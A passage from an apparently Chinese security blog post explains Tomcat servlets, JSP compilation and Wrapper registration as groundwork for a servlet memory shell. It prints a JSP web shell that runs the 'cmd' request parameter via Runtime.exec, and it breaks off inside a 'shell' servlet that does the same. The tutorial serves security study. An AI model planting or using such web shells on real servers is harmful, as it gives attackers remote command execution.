+ServletContextAttributeListener：监听Servlet上下文属性的添加、删除和替换；</p>
+<p>HttpSessionListener：对Session的创建和销毁进行监听。Session的销毁有两种情况，一个中Session超时，还有一种是通过调用Session对象的invalidate()方法使session失效。</p>
+<p>HttpSessionAttributeListener：对Session对象中属性的添加、删除和替换进行监听；</p>
+<p>ServletRequestListener：对请求对象的初始化和销毁进行监听；
+ServletRequestAttributeListener：对请求对象属性的添加、删除和替换进行监听。</p>
+<h6 id="用途">用途</h6>
+<p>可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。</p>
+<h4 id="jsp的本质">3.jsp的本质</h4>
+<p>我们简单的编写一个jsp文件，并把它放在webapps/ServletTest下面，代码如下</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));%&gt;</span><br></pre></td></tr></table></figure>
+<p>使用tomcat服务器进行启动之后，我们可以尝试访问该文件，并传入测试使用的payload。从下面我们可以看到是正常执行的。</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%862.png" class>
+<p>但是我们要具体的看一看服务端是怎么解析jsp的，为什么jsp里面的java代码可以正常执行呢？我们最终可以在<code>D:\Java_Tools\apache-tomcat-8.5.93\work\Catalina\localhost\ServletTest\org\apache\jsp</code>目录下找到答案</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%863.png" class>
+<p>原来我们所编写的jsp文件被编译器编译了，编译器最终把他们输出到了这个文件夹里面。其中index_jsp.java的代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.jsp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.jsp.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">index_jsp</span> <span class="keyword">extends</span> <span class="title class_">org</span>.apache.jasper.runtime.HttpJspBase</span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">org</span>.apache.jasper.runtime.JspSourceDependent,</span><br><span class="line">                 org.apache.jasper.runtime.JspSourceImports &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> javax.servlet.jsp.<span class="type">JspFactory</span> <span class="variable">_jspxFactory</span> <span class="operator">=</span></span><br><span class="line">          javax.servlet.jsp.JspFactory.getDefaultFactory();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> java.util.Map&lt;java.lang.String,java.lang.Long&gt; _jspx_dependants;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> java.util.Set&lt;java.lang.String&gt; _jspx_imports_packages;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> java.util.Set&lt;java.lang.String&gt; _jspx_imports_classes;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> &#123;</span><br><span class="line">    _jspx_imports_packages = <span class="keyword">new</span> <span class="title class_">java</span>.util.HashSet&lt;&gt;();</span><br><span class="line">    _jspx_imports_packages.add(<span class="string">&quot;javax.servlet&quot;</span>);</span><br><span class="line">    _jspx_imports_packages.add(<span class="string">&quot;javax.servlet.http&quot;</span>);</span><br><span class="line">    _jspx_imports_packages.add(<span class="string">&quot;javax.servlet.jsp&quot;</span>);</span><br><span class="line">    _jspx_imports_classes = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">volatile</span> javax.el.ExpressionFactory _el_expressionfactory;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">volatile</span> org.apache.tomcat.InstanceManager _jsp_instancemanager;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> java.util.Map&lt;java.lang.String,java.lang.Long&gt; getDependants() &#123;</span><br><span class="line">    <span class="keyword">return</span> _jspx_dependants;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> java.util.Set&lt;java.lang.String&gt; getPackageImports() &#123;</span><br><span class="line">    <span class="keyword">return</span> _jspx_imports_packages;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> java.util.Set&lt;java.lang.String&gt; getClassImports() &#123;</span><br><span class="line">    <span class="keyword">return</span> _jspx_imports_classes;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> javax.el.ExpressionFactory <span class="title function_">_jsp_getExpressionFactory</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (_el_expressionfactory == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (_el_expressionfactory == <span class="literal">null</span>) &#123;</span><br><span class="line">          _el_expressionfactory = _jspxFactory.getJspApplicationContext(getServletConfig().getServletContext()).getExpressionFactory();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> _el_expressionfactory;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> org.apache.tomcat.InstanceManager <span class="title function_">_jsp_getInstanceManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (_jsp_instancemanager == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (_jsp_instancemanager == <span class="literal">null</span>) &#123;</span><br><span class="line">          _jsp_instancemanager = org.apache.jasper.runtime.InstanceManagerFactory.getInstanceManager(getServletConfig());</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> _jsp_instancemanager;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">_jspInit</span><span class="params">()</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">_jspDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">_jspService</span><span class="params">(<span class="keyword">final</span> javax.servlet.http.HttpServletRequest request, <span class="keyword">final</span> javax.servlet.http.HttpServletResponse response)</span></span><br><span class="line">      <span class="keyword">throws</span> java.io.IOException, javax.servlet.ServletException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> java.lang.<span class="type">String</span> <span class="variable">_jspx_method</span> <span class="operator">=</span> request.getMethod();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="string">&quot;GET&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="string">&quot;POST&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="string">&quot;HEAD&quot;</span>.equals(_jspx_method) &amp;&amp; !javax.servlet.DispatcherType.ERROR.equals(request.getDispatcherType())) &#123;</span><br><span class="line">      response.sendError(HttpServletResponse.SC_METHOD_NOT_ALLOWED, <span class="string">&quot;JSP 只允许 GET、POST 或 HEAD。Jasper 还允许 OPTIONS&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> javax.servlet.jsp.PageContext pageContext;</span><br><span class="line">    javax.servlet.http.<span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">final</span> javax.servlet.ServletContext application;</span><br><span class="line">    <span class="keyword">final</span> javax.servlet.ServletConfig config;</span><br><span class="line">    javax.servlet.jsp.<span class="type">JspWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">final</span> java.lang.<span class="type">Object</span> <span class="variable">page</span> <span class="operator">=</span> <span class="built_in">this</span>;</span><br><span class="line">    javax.servlet.jsp.<span class="type">JspWriter</span> <span class="variable">_jspx_out</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    javax.servlet.jsp.<span class="type">PageContext</span> <span class="variable">_jspx_page_context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">      pageContext = _jspxFactory.getPageContext(<span class="built_in">this</span>, request, response,</span><br><span class="line">      			<span class="literal">null</span>, <span class="literal">true</span>, <span class="number">8192</span>, <span class="literal">true</span>);</span><br><span class="line">      _jspx_page_context = pageContext;</span><br><span class="line">      application = pageContext.getServletContext();</span><br><span class="line">      config = pageContext.getServletConfig();</span><br><span class="line">      session = pageContext.getSession();</span><br><span class="line">      out = pageContext.getOut();</span><br><span class="line">      _jspx_out = out;</span><br><span class="line"></span><br><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.lang.Throwable t) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!(t <span class="keyword">instanceof</span> javax.servlet.jsp.SkipPageException))&#123;</span><br><span class="line">        out = _jspx_out;</span><br><span class="line">        <span class="keyword">if</span> (out != <span class="literal">null</span> &amp;&amp; out.getBufferSize() != <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (response.isCommitted()) &#123;</span><br><span class="line">              out.flush();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              out.clearBuffer();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> (_jspx_page_context != <span class="literal">null</span>) _jspx_page_context.handlePageException(t);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(t);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      _jspxFactory.releasePageContext(_jspx_page_context);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从代码中我们可以发现，class
+index_jsp是一个继承了org.apache.jasper.runtime.HttpJspBase的类，再往深处去追究我们看到HttpJspBase的实现代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.jasper.runtime;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.jsp.HttpJspPage;</span><br><span class="line"><span class="keyword">import</span> org.apache.jasper.compiler.Localizer;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">HttpJspBase</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> <span class="keyword">implements</span> <span class="title class_">HttpJspPage</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">HttpJspBase</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="built_in">super</span>.init(config);</span><br><span class="line">        <span class="built_in">this</span>.jspInit();</span><br><span class="line">        <span class="built_in">this</span>._jspInit();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Localizer.getMessage(<span class="string">&quot;jsp.engine.info&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.jspDestroy();</span><br><span class="line">        <span class="built_in">this</span>._jspDestroy();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>._jspService(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">jspInit</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">_jspInit</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">jspDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">_jspDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">_jspService</span><span class="params">(HttpServletRequest var1, HttpServletResponse var2)</span> <span class="keyword">throws</span> ServletException, IOException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从上面的代码中我们可以看出HttpJspBase类继承自HttpServlet，综合上面所述我们最终发现我们编写的jsp文件编译之后事实上是一个HttpServlet。</p>
+<p>实际上tomcat维护了一个大的hashmap&lt;id，Servlet&gt;
+里面存放着servlet实例，当我们第一次尝试访问这个servlet路径时，tomcat使用反射将该servlet实例化同时调用init()
+作初始化，之后这个实例就存放在了tomcat维护的hashmap&lt;id,Servlet&gt;中供后续使用。当再次请求这个servlet资源的时候，由于hashmap&lt;id,Servlet&gt;已经有这个实例
+，所以这时也不用再实例化对象，直接就可以使用了，因此init()
+也不会调用。</p>
+<p>可以看出 servlet
+自实例化以来就一直可以常驻内存中，直到服务器关闭或Servlet调取destroy()方法进行销毁,Servlet生命周期才正式结束。</p>
+<h4 id="tomcat架构">4.tomcat架构</h4>
+<p>当我们在学习ajp协议的时候曾经学过下面的这个图，下面这个图很好的诠释了tomcat的基本架构，包含了Container，Engine，Host，Context，Wrapper。</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%8611.png" class>
+<p>Service：Service是提供具体对外服务的（默认只有一个），一个Service容器中又可以有多个Connector组件（监听不同端口请求，解析请求）和一个Servlet容器（做具体的业务逻辑处理）；Service组件本身没做其他事</p>
+<p>Engine和Host：Engine组件（引擎）是Servlet容器Catalina的核心，它支持在其下定义多个虚拟主机（Host），虚拟主机允许Tomcat引擎在将配置在一台机器上的多个域名，比如www.baidu.com、www.bat.com分割开来互不干扰；</p>
+<p>Context：每个虚拟主机又可以支持多个web应用部署在它下边，这就是我们所熟知的上下文对象Context，上下文是使用由Servlet规范中指定的Web应用程序格式表示，不论是压缩过的war包形式的文件还是未压缩的目录形式；(webapps目录下的目录，一个context就是一个目录)</p>
+<p>Wrapper：在上下文中又可以部署多个servlet，并且每个servlet都会被一个包装组件（Wrapper）所包含（一个wrapper对应一个servlet）</p>
+<h5 id="wrapper对象的创建">4.1Wrapper对象的创建</h5>
+<p>我们说过了一点，要想实现内存马，我们需要在该网站的服务当中注册一个servlet，而这个servlet在tomcat架构当中其实就是wrapper，他的创建和管理是交给他的上层来实现的，即Context。所以我们来到Context相关的代码里面，寻找有关创建wrapper的代码段，得益于之前分析ajp的经历，我很快的从源码中找到了如下的代码段在ConfigCointext.java里面</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">            <span class="comment">// Description is ignored</span></span><br><span class="line">            <span class="comment">// Display name is ignored</span></span><br><span class="line">            <span class="comment">// Icons are ignored</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// jsp-file gets passed to the JSP Servlet as an init-param</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setName(servlet.getServletName());</span><br><span class="line">            Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">            <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">                wrapper.addSecurityReference(</span><br><span class="line">                        roleRef.getName(), roleRef.getLink());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">            <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();</span><br><span class="line">            <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (multipartdef.getMaxFileSize() != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                        multipartdef.getMaxRequestSize()!= <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                        multipartdef.getFileSizeThreshold() != <span class="literal">null</span>) &#123;</span><br><span class="line">                    wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(</span><br><span class="line">                            multipartdef.getLocation(),</span><br><span class="line">                            Long.parseLong(multipartdef.getMaxFileSize()),</span><br><span class="line">                            Long.parseLong(multipartdef.getMaxRequestSize()),</span><br><span class="line">                            Integer.parseInt(</span><br><span class="line">                                    multipartdef.getFileSizeThreshold())));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(</span><br><span class="line">                            multipartdef.getLocation()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setAsyncSupported(</span><br><span class="line">                        servlet.getAsyncSupported().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line">            context.addChild(wrapper);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;String, String&gt; entry :</span><br><span class="line">                webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">            context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>代码的主要逻辑事实上就是通过遍历webxml当中所有的servlet，为每一个servlet都创建一个wrapper，中间为wrapper填入各种的初始值，最终把wrapper放到context里面，最后1将Servlet与URL模式进行映射，并将映射关系添加到上下文中，以便后续请求匹配对应的Servlet进行处理。当忽略很多对我峨嵋你没有用的参数之后，我们最后中可以得到下面的几行代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">wrapper.setName(servlet.getServletName());</span><br><span class="line">wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">context.addChild(wrapper);</span><br><span class="line">context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br></pre></td></tr></table></figure>
+<p>这段代码的作用是创建一个Wrapper对象，并将其添加到上下文中，同时将Servlet与URL模式进行映射。具体逻辑如下：</p>
+<p>创建一个Wrapper对象，调用上下文（Context）的createWrapper()方法，返回一个新的Wrapper实例，并将其赋值给wrapper变量。</p>
+<p>设置Wrapper的名称，即调用setName()方法，将Servlet的名称（servletName）设置为Wrapper的名称。</p>
+<p>设置Wrapper的Servlet类名，即调用setServletClass()方法，将Servlet的类名（servletClass）设置为Wrapper的Servlet类名。</p>
+<p>将创建的Wrapper对象添加到上下文中，即调用上下文的addChild()方法，将Wrapper作为子元素添加到上下文中。</p>
+<p>将Servlet与URL模式进行映射并添加到上下文中，即调用上下文的addServletMappingDecoded()方法，将URL模式和Wrapper的名称作为参数传入，将URL模式与对应的Servlet进行映射。</p>
+<p>通过以上步骤，可以实现创建Wrapper对象并将其添加到上下文中，同时将Servlet与URL模式进行映射，以便后续根据URL模式匹配到对应的Servlet进行请求处理。</p>
+<h4 id="内存马实现servlet">5.内存马实现——servlet</h4>
+<p>要想实现上面的几行代码，我们需要一些准备，首先是context，Context本质上是一个接口我们需要一个实现了Context接口的实例，从接口实现上我们找到了如下的一些内容：</p>
+<figure>
+<img data-src="E:\JAVA安全\内存马\内存马\原理\4.png" alt="4">
+<figcaption aria-hidden="true">4</figcaption>
+</figure>
+<p>我们简单的写一个servlet出来看一眼，这个就是我们内存马的主体了</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span><br><span class="line">                <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;FanXing&quot;</span>);</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(req.getParameter(<span class="string">&quot;cmd&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 